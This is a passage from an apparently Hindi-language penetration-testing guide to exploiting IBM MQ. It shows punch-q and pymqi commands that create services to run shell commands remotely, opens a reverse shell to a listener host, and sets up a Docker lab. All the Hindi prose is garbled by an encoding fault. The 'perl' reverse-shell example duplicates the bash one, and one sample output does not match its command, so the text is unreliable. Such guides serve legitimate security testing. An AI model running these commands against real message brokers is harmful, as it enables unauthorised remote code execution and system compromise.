> * [‡§∏‡•ç‡§•‡§ø‡§∞‡§æ‡§Ç‡§ï ‡§∏‡•á](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes)‡•§
>
> ‡§è‡§ï ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§π‡•à `MQCMD_CREATE_SERVICE` ‡§î‡§∞ ‡§á‡§∏‡§ï‡§æ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º [‡§Ø‡§π‡§æ‡§Å](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms) ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à‡•§ ‡§Ø‡§π ‡§è‡§ï `StartCommand` ‡§ï‡•ã ‡§§‡§∞‡•ç‡§ï ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≤‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§™‡§∞ ‡§è‡§ï ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à (‡§â‡§¶‡§æ‡§π‡§∞‡§£: `/bin/sh`)‡•§
>
> ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§Æ‡•á‡§Ç ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡§æ ‡§è‡§ï ‡§ö‡•á‡§§‡§æ‡§µ‡§®‡•Ä ‡§≠‡•Ä ‡§π‡•à: *"‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç: ‡§Ø‡§π ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã mqm ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§á‡§∏ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¶‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Ø‡§æ ‡§≤‡§æ‡§™‡§∞‡§µ‡§æ‡§π ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§®‡•Å‡§ï‡§∏‡§æ‡§® ‡§™‡§π‡•Å‡§Ç‡§ö‡§æ‡§§‡•Ä ‡§π‡•à, ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§π‡§ü‡§æ‡§ï‡§∞‡•§"*
>
> *‡§®‡•ã‡§ü: ‡§π‡§Æ‡•á‡§∂‡§æ IBM MQ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º (‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§® ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠) ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, `/admin/action/qmgr/{qmgrName}/mqsc` ‡§™‡§∞ ‡§è‡§ï HTTP ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§≠‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§∏‡•á‡§µ‡§æ ‡§®‡§ø‡§∞‡•ç‡§Æ‡§æ‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Æ‡§ï‡§ï‡•ç‡§∑ MQSC ‡§ï‡§Æ‡§æ‡§Ç‡§° (`DEFINE SERVICE`) ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•à‡•§ ‡§Ø‡§π ‡§™‡§π‡§≤‡•Ç ‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§≠‡•Ä ‡§§‡§ï ‡§ï‡§µ‡§∞ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§*

‡§¶‡•Ç‡§∞‡§∏‡•ç‡§• ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§≤‡§ø‡§è PCF ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡•á‡§µ‡§æ ‡§®‡§ø‡§∞‡•ç‡§Æ‡§æ‡§£ / ‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•ã **punch-q** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

**‡§â‡§¶‡§æ‡§π‡§∞‡§£ 1**
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> IBM MQ ‡§ï‡•á ‡§≤‡•â‡§ó ‡§Æ‡•á‡§Ç, ‡§Ü‡§™ ‡§™‡§¢‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§∏‡§´‡§≤‡§§‡§æ‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•Å‡§Ü ‡§π‡•à:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

‡§Ü‡§™ ‡§Æ‡§∂‡•Ä‡§® ‡§™‡§∞ ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡•ã‡§Ç ‡§ï‡•Ä ‡§ó‡§£‡§®‡§æ ‡§≠‡•Ä ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§Ø‡§π‡§æ‡§Å `/bin/doesnotexist` ... ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à):
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**‡§ß‡•ç‡§Ø‡§æ‡§® ‡§∞‡§ñ‡•á‡§Ç ‡§ï‡§ø ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§≤‡•â‡§®‡•ç‡§ö ‡§Ö‡§∏‡§ø‡§Ç‡§ï‡•ç‡§∞‡•ã‡§®‡§∏ ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§Ü‡§á‡§ü‡§Æ ‡§ö‡§æ‡§π‡§ø‡§è** ***(‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§ø‡§∏‡•ç‡§®‡§∞, ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§∏‡•á‡§µ‡§æ ‡§™‡§∞ ‡§´‡§º‡§æ‡§á‡§≤ ‡§®‡§ø‡§∞‡•ç‡§Æ‡§æ‡§£, ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§°‡•á‡§ü‡§æ ‡§®‡§ø‡§ï‡§æ‡§∏‡•Ä ...)***

**‡§â‡§¶‡§æ‡§π‡§∞‡§£ 2**

‡§Ü‡§∏‡§æ‡§® ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤ ‡§ï‡•á ‡§≤‡§ø‡§è, **punch-q** ‡§¶‡•ã ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤ ‡§™‡•á‡§≤‡•ã‡§° ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:

* ‡§è‡§ï bash ‡§ï‡•á ‡§∏‡§æ‡§•
* ‡§è‡§ï perl ‡§ï‡•á ‡§∏‡§æ‡§•

*‡§¨‡§ø‡§≤‡•ç‡§ï‡•Å‡§≤, ‡§Ü‡§™ `execute` ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ï‡§∏‡•ç‡§ü‡§Æ ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§*

bash ‡§ï‡•á ‡§≤‡§ø‡§è:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
perl ‡§ï‡•á ‡§≤‡§ø‡§è:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

‡§Ü‡§™ IBM MQ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§Æ‡•á‡§Ç ‡§ó‡§π‡§∞‡§æ‡§à ‡§∏‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ **pymqi** ‡§™‡§æ‡§Ø‡§•‡§® ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§ï‡§æ ‡§∏‡•Ä‡§ß‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø **punch-q** ‡§Æ‡•á‡§Ç ‡§≤‡§æ‡§ó‡•Ç ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§è ‡§ó‡§è ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü PCF ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡§æ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§∏‡•ç‡§•‡§æ‡§Ø‡•Ä ‡§®‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§¢‡•Ç‡§Ç‡§¢ ‡§™‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ [IBM MQ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors) ‡§ï‡§æ ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§≤‡•á ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

> *[`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) ‡§ï‡§æ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (‡§¶‡§∂‡§Æ‡§≤‡§µ = 73)‡•§ ‡§á‡§∏‡•á `MQCA_CLUSTER_NAME` (‡§¶‡§∂‡§Æ‡§≤‡§µ = 2029) ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã `*` ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£

‡§Ø‡§¶‡§ø ‡§Ü‡§™ IBM MQ ‡§ï‡•á ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§î‡§∞ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§æ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ Docker ‡§™‡§∞ ‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§è‡§ï ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§∏‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

1. ibm.com ‡§î‡§∞ cloud.ibm.com ‡§™‡§∞ ‡§è‡§ï ‡§ñ‡§æ‡§§‡§æ ‡§π‡•ã‡§®‡§æ‡•§
2. ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡§æ‡§á‡§ú‡•ç‡§° IBM MQ ‡§¨‡§®‡§æ‡§è‡§Ç:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á, ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ `admin` ‡§π‡•à ‡§î‡§∞ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° `passw0rd` ‡§π‡•à (‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ö‡§∞ `MQ_ADMIN_PASSWORD`)‡•§ ‡§Ø‡§π‡§æ‡§Å, ‡§ï‡§§‡§æ‡§∞ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§ï‡§æ ‡§®‡§æ‡§Æ `MYQUEUEMGR` ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à (‡§ö‡§∞ `MQ_QMGR_NAME`)‡•§

‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ IBM MQ ‡§ö‡§æ‡§≤‡•Ç ‡§î‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§™‡•ã‡§∞‡•ç‡§ü‡•ç‡§∏ ‡§ñ‡•ã‡§≤‡•á ‡§π‡•Å‡§è ‡§π‡•ã‡§®‡•á ‡§ö‡§æ‡§π‡§ø‡§è:
```bash
‚ùØ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ ‡§°‡•â‡§ï‡§∞ ‡§á‡§Æ‡•á‡§ú ‡§ï‡•á ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Ø‡§π‡§æ‡§Å ‡§π‡•à‡§Ç: https://hub.docker.com/r/ibmcom/mq/.

## References

* [mgeeky's gist - "Practical IBM MQ Penetration Testing notes"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ documentation](https://www.ibm.com/docs/en/ibm-mq)
